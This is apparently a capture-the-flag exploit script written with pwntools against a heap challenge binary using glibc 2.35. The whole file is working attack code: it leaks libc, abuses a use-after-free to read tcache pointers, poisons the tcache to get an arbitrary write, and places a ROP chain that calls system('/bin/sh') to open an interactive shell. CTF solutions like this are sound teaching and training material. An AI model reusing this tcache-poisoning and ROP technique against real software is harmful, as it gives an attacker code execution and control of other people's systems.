#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./heap')
libc = ELF('./libc.2.35.so')
context.terminal=['tmux', 'split-window', '-h']

host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
handle SIGALRM ignore
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

###
### Menu interaction
###

def Malloc(Index):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'index: ', str(Index).encode())

def Write(Index, Value):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', str(Index).encode())
    if (len(Value) == 0x10):
        io.sendafter(b'value: ', Value[:0x0f])
    else:
        io.sendlineafter(b'value: ', Value)

def Free(Index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index: ', str(Index).encode())

def View(Index):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'index: ', str(Index).encode())

def Exit():
    io.sendlineafter(b'> ', b'5')

def Leak():
    io.sendlineafter(b'> ', b'6')

###
### Libc Leak
###

Leak()
free_leak = int(io.recvline().strip(),10);
libc.address = free_leak - libc.sym.free
log.info(f"Libc @ { hex(libc.address) }")

###
### Use after free to leak tcache
###
Malloc(0)
Malloc(1)
Free(0)
Free(1)
View(0)
value_0 = u64(io.recvline().strip().ljust(8,b'\0'))
View(1)
value_1 = u64(io.recvline().strip().ljust(8,b'\0'))
log.info(f"Value_0: { hex(value_0)}")
log.info(f"Value_1: { hex(value_1)}")

###
### corrupting tcache to leak environ
###
Write(1, p64((libc.sym.environ)^value_0))
Malloc(0)
Malloc(0)
View(0)
environ = u64(io.recvline().strip().ljust(8,b'\0'))
log.info(f"environ @ { hex(environ) }")

###
### Write What Where
###
def WWW(Where, What):
    Malloc(0)
    Malloc(1)
    Free(0)
    Free(1)
    Write(1, p64(Where^value_0))
    Malloc(0)
    Malloc(0)
    Write(0, What)

rop = ROP(libc)
rop.raw(rop.ret.address) # har du aligna stacken ?
rop.system(next(libc.search(b'/bin/sh\0')))
payload = p64(0) + bytes(rop.chain())

for IDX,WAT in enumerate([ payload[i:i+16] for i in range(0,len(payload),16) ]):
    WWW(environ - 0x120-8 + 16*IDX, WAT)

io.sendlineafter(b'> ', b'7')
io.interactive()

